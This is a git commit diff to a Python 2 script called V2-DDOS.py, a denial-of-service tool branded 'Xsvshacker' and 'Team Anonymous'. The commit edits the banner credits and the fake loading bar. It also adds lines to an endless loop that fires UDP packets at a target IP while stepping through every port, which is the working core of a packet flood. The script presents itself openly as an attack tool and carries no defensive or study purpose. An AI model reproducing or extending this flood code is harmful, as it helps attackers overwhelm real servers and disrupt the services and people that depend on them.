aff3c17a30e59015c7153824174d4a893ed97b2b
xsvshacker <139484260+xsvshacked@users.noreply.github.com>
2023-12-17 18:33:49 +0700

    Update V2-DDOS.py

--- V2-DDOS.py
+++ V2-DDOS.py
@@ -22,8 +22,8 @@ os.system("clear")
 os.system("figlet XsvsHacker")
 print
 print "Coded By : Xsvshacker"
-print "Author   : T34m anonym"
-print "Github   : github.com/xsvshacked/xsvshacked"
+print "Author   : T34m hack"
+print "Github   : github.com/T34mAnonymous"
 print "Fb Page  : facebook.com/TeamAnonymous"
 print "FB Group : facebook.com/groups/anonymous"
 print "Telegram : t.me/xsvshacker"
@@ -37,13 +37,11 @@ print("\033[93m")
 os.system("figlet XsvsHacker")
 print("Team : Anonymous")
 print ("\033[92m")
-print "[===                  ] 1%"
+print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 10%"
+print "[=====               ] 25%"
 time.sleep(5)
-print "[========            ] 25%"
-time.sleep(5)
-print "[===========         ] 50%"
+print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
@@ -51,6 +49,12 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
